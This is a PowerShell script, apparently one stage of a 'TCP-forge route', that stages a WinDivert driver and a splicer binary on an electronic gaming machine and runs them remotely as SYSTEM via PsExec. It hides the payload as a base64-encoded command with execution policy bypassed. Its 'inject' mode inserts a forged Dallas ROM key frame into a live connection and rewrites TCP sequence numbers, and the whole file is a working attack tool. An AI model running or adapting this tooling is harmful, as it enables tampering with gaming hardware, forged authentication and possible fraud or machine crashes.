<#
.SYNOPSIS
    PHASE 2 of the TCP-forge route. Deploys the WinDivert seq/ack-rewriting
    splicer (DallasSplice.exe) to the EGM, targets exactly ONE CommCtrl(:30800)
    <-> consumer connection, and runs it remotely via PsExec.

.DESCRIPTION
    Two modes (passed straight through to DallasSplice.exe):

      passthru  (default, SAFE) : divert the target connection, re-inject every
                packet UNCHANGED (delta stays 0). Proves the divert / checksum /
                re-inject path keeps the live connection healthy. Safe to stop
                at any moment.

      inject    (ACCEPTED RISK) : insert a synthetic Dallas ROM frame once, then
                permanently rewrite the connection's seq/ack. Once injected,
                stopping while the connection is still open DESYNCS it (RST ->
                possible 'Unexpected game stop' reboot). Lab cabinet only.

    Target selection on the EGM prefers OneHand, then BiOS2, then any established
    consumer of :30800. The WinDivert filter is scoped to ONLY that 4-tuple, so
    the other subscribers are never touched.

.EXAMPLE
    # Safe validation first:
    & .\Invoke-DallasSpliceRemote.ps1 -ComputerName 10.0.0.90 -Mode passthru -RunSeconds 20

    # Then the real injection:
    & .\Invoke-DallasSpliceRemote.ps1 -ComputerName 10.0.0.90 -Mode inject -RunSeconds 30 -InjectAfterMs 2500
#>
[CmdletBinding()]
param(
    [string] $ComputerName = '10.0.0.90',
    [string] $PsExecPath   = 'C:\Tools\PSTools\PsExec.exe',
    [ValidateSet('passthru','inject','heal')]
    [string] $Mode         = 'passthru',
    [int]    $RunSeconds   = 20,
    [int]    $InjectAfterMs= 2500,
    [int]    $InitialDelta = 0,    # heal mode: known offset to drain away
    [int]    $DrainReserveSec = 6, # inject mode: seconds before end to start drain
    [string] $Rom          = '01D68A721B000019',
    [string] $TargetProcess= '',   # force a specific consumer process name (optional)
    [string] $WinDivertDir = 'C:\Tools\WinDivert\extracted\WinDivert-2.2.2-A\x64',
    [string] $ExePath      = 'C:\Users\Ezbogar\GoldclubLogInvestigator\DallasSplice.exe'
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$dll = Join-Path $WinDivertDir 'WinDivert.dll'
$sys = Join-Path $WinDivertDir 'WinDivert64.sys'
foreach ($f in @($PsExecPath, $dll, $sys, $ExePath)) {
    if (-not (Test-Path -LiteralPath $f)) { throw "Required file not found: $f" }
}

$remoteDirUnc = "\\$ComputerName\c`$\Windows\Temp\wd"
$statusUnc    = Join-Path $remoteDirUnc 'splice_status.txt'
$logUnc       = Join-Path $remoteDirUnc 'splice.log'
$errUnc       = Join-Path $remoteDirUnc 'splice.err'

Write-Host ''
Write-Host '==========================================================' -ForegroundColor Cyan
Write-Host (' Dallas TCP splicer (Phase 2) -- mode: {0}' -f $Mode.ToUpper()) -ForegroundColor Cyan
Write-Host '==========================================================' -ForegroundColor Cyan
Write-Host (" Target host : \\{0}" -f $ComputerName) -ForegroundColor Gray
Write-Host (" RunSeconds  : {0}   InjectAfterMs: {1}" -f $RunSeconds, $InjectAfterMs) -ForegroundColor Gray
if ($Mode -eq 'inject') {
    Write-Host ' WARNING: inject mode rewrites the live connection. Stopping while' -ForegroundColor Yellow
    Write-Host '          it is open desyncs it (RST -> possible reboot).'          -ForegroundColor Yellow
}
Write-Host '----------------------------------------------------------' -ForegroundColor Cyan

if (-not (Test-Path -LiteralPath $remoteDirUnc)) { New-Item -ItemType Directory -Force -Path $remoteDirUnc | Out-Null }
Copy-Item -LiteralPath $dll     -Destination $remoteDirUnc -Force
Copy-Item -LiteralPath $sys     -Destination $remoteDirUnc -Force
Copy-Item -LiteralPath $ExePath -Destination $remoteDirUnc -Force
Write-Host ' Staged WinDivert.dll + WinDivert64.sys + DallasSplice.exe.' -ForegroundColor Green

$remote = @'
$ErrorActionPreference = "SilentlyContinue"
$wd     = "C:\Windows\Temp\wd"
$mode   = "__MODE__"
$runSec = __RUNSEC__
$injMs  = __INJMS__
$rom    = "__ROM__"
$force  = "__FORCE__"
$initD  = __INITD__
$drainR = __DRAINR__
$prefer = @("OneHand","BiOS2","Bootstrap")

$conns = Get-NetTCPConnection -RemotePort 30800 -State Established
$rows = @()
foreach ($c in $conns) {
    $pname = ""
    try { $pname = (Get-Process -Id $c.OwningProcess).ProcessName } catch {}
    $rows += [pscustomobject]@{ LocalPort = $c.LocalPort; PID = $c.OwningProcess; Name = $pname }
}
$target = $null
if ($force) { $target = $rows | Where-Object { $_.Name -ieq $force } | Select-Object -First 1 }
if (-not $target) { foreach ($p in $prefer) { $m = $rows | Where-Object { $_.Name -ieq $p } | Select-Object -First 1; if ($m) { $target = $m; break } } }
if (-not $target) { $target = $rows | Select-Object -First 1 }

$lines = @("CONSUMERS:")
foreach ($r in $rows) { $lines += ("  port={0} pid={1} name={2}" -f $r.LocalPort, $r.PID, $r.Name) }
if (-not $target) { $lines += "NO_TARGET"; Set-Content "$wd\splice_status.txt" ($lines -join [Environment]::NewLine); return }
$ephem = $target.LocalPort
$lines += ("TARGET: port={0} pid={1} name={2}" -f $target.LocalPort, $target.PID, $target.Name)
$lines += ("MODE={0} RUNSEC={1} INJMS={2} ROM={3}" -f $mode, $runSec, $injMs, $rom)
Set-Content "$wd\splice_status.txt" ($lines -join [Environment]::NewLine)

Remove-Item "$wd\splice.log","$wd\splice.err" -Force -ErrorAction SilentlyContinue
$p = Start-Process -FilePath "$wd\DallasSplice.exe" `
    -ArgumentList @("$ephem", $mode, "$runSec", "$injMs", $rom, "$initD", "$drainR") -WorkingDirectory $wd `
    -RedirectStandardOutput "$wd\splice.log" -RedirectStandardError "$wd\splice.err" -PassThru -WindowStyle Hidden
Start-Sleep -Seconds ($runSec + 5)
try { if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force } } catch {}
Add-Content "$wd\splice_status.txt" ("EXITCODE={0}" -f $(try { $p.ExitCode } catch { "n/a" }))
# Defensive: ensure the WinDivert driver is never left resident.
Start-Sleep -Milliseconds 500
sc.exe stop WinDivert   | Out-Null
sc.exe delete WinDivert | Out-Null
'@
$remote = $remote.Replace('__MODE__', $Mode).Replace('__RUNSEC__', [string]$RunSeconds).Replace('__INJMS__', [string]$InjectAfterMs).Replace('__ROM__', $Rom).Replace('__FORCE__', $TargetProcess).Replace('__INITD__', [string]$InitialDelta).Replace('__DRAINR__', [string]$DrainReserveSec)

$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($remote))

Write-Host (' Running splicer on the EGM ({0}s window)...' -f $RunSeconds) -ForegroundColor Cyan
$psTimeout = $RunSeconds + 60
& $PsExecPath "\\$ComputerName" -accepteula -s -n $psTimeout powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc | Out-Null

Start-Sleep -Milliseconds 700

Write-Host ''
Write-Host ' --- Target / consumers ---' -ForegroundColor Cyan
if (Test-Path -LiteralPath $statusUnc) { Write-Host (Get-Content -LiteralPath $statusUnc -Raw) } else { Write-Host ' (no status file)' -ForegroundColor Red }

Write-Host ' --- Splicer log ---' -ForegroundColor Cyan
if (Test-Path -LiteralPath $logUnc) {
    $log = Get-Content -LiteralPath $logUnc -Raw
    if ($log) { Write-Host $log } else { Write-Host ' (log empty)' -ForegroundColor Yellow }
} else { Write-Host ' (no log file)' -ForegroundColor Red }

if (Test-Path -LiteralPath $errUnc) {
    $e = Get-Content -LiteralPath $errUnc -Raw
    if ($e) { $e = $e.Trim() }
    if ($e) { Write-Host ' --- Splicer stderr ---' -ForegroundColor Yellow; Write-Host $e -ForegroundColor Yellow }
}

Write-Host ''
Write-Host ' Done.' -ForegroundColor Green
if ($Mode -eq 'inject') {
    Write-Host ' If the connection desynced, recover with Recover-EgmCabinet.ps1.' -ForegroundColor DarkYellow
}
